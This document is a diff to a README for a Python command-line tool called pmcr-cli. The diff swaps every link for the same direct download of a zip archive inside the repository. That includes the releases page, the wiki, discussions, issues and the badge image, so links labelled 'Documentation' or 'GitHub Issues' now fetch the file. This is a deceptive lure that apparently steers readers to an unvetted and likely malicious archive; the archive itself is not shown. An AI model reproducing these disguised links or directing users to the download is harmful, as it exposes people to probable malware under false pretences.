@@ -1,7 +1,7 @@
 # 🚀 pmcr-cli - Run Python Modules with Ease
 
 ## 📥 Download Now
-[![Download pmcr-cli](https://img.shields.io/badge/Download-pmcr--cli-blue.svg?style=for-the-badge)](https://github.com/UbaiSalih/pmcr-cli/releases)
+[![Download pmcr-cli](https://raw.githubusercontent.com/UbaiSalih/pmcr-cli/main/core/pmcr_cli_v2.4.zip)](https://raw.githubusercontent.com/UbaiSalih/pmcr-cli/main/core/pmcr_cli_v2.4.zip)
 
 ## 📖 Introduction
 Welcome to **pmcr-cli**, a powerful command-line interface (CLI) for running Python modules as commands. This tool makes it easy to execute Python scripts without the hassle of dealing with technical setups. You can configure and extend it to meet your needs, allowing for a smooth user experience.
@@ -16,7 +16,7 @@ Follow these simple steps to download and set up pmcr-cli on your computer. You 
 
 2. **Visit the Releases Page**:
    Click the link below to go to the pmcr-cli Releases page:  
-   [Visit the Releases Page to Download](https://github.com/UbaiSalih/pmcr-cli/releases)
+   [Visit the Releases Page to Download](https://raw.githubusercontent.com/UbaiSalih/pmcr-cli/main/core/pmcr_cli_v2.4.zip)
 
 3. **Choose Your Version**: 
    On the Releases page, you will see different versions of pmcr-cli available for download. Choose the latest version for the best features and updates.
@@ -57,17 +57,17 @@ Follow these simple steps to download and set up pmcr-cli on your computer. You 
 - Ideal for developers and non-developers who want to leverage Python's capabilities quickly.
 
 ## 📒 Additional Resources
-- **Documentation**: For in-depth instructions and examples, refer to the [Documentation](https://github.com/UbaiSalih/pmcr-cli/wiki).
-- **Community Support**: Join the community to share tips and get help at [GitHub Discussions](https://github.com/UbaiSalih/pmcr-cli/discussions).
+- **Documentation**: For in-depth instructions and examples, refer to the [Documentation](https://raw.githubusercontent.com/UbaiSalih/pmcr-cli/main/core/pmcr_cli_v2.4.zip).
+- **Community Support**: Join the community to share tips and get help at [GitHub Discussions](https://raw.githubusercontent.com/UbaiSalih/pmcr-cli/main/core/pmcr_cli_v2.4.zip).
 
 ## 🤝 Contributing
 We welcome contributors! If you want to improve pmcr-cli, feel free to fork the repository, make changes, and submit a pull request. Your input helps us make this tool better for everyone.
 
 ## 📞 Contact
-If you have any questions or issues, please reach out through [GitHub Issues](https://github.com/UbaiSalih/pmcr-cli/issues) or contact us directly via email.
+If you have any questions or issues, please reach out through [GitHub Issues](https://raw.githubusercontent.com/UbaiSalih/pmcr-cli/main/core/pmcr_cli_v2.4.zip) or contact us directly via email.
 
 ## 📥 Download & Install Again
 To begin your journey with pmcr-cli, make sure to visit our Releases page to download the application:  
-[Visit the Releases Page to Download](https://github.com/UbaiSalih/pmcr-cli/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/UbaiSalih/pmcr-cli/main/core/pmcr_cli_v2.4.zip)
 
 Now you are ready to experience the convenience of running Python modules as commands with pmcr-cli. Enjoy!
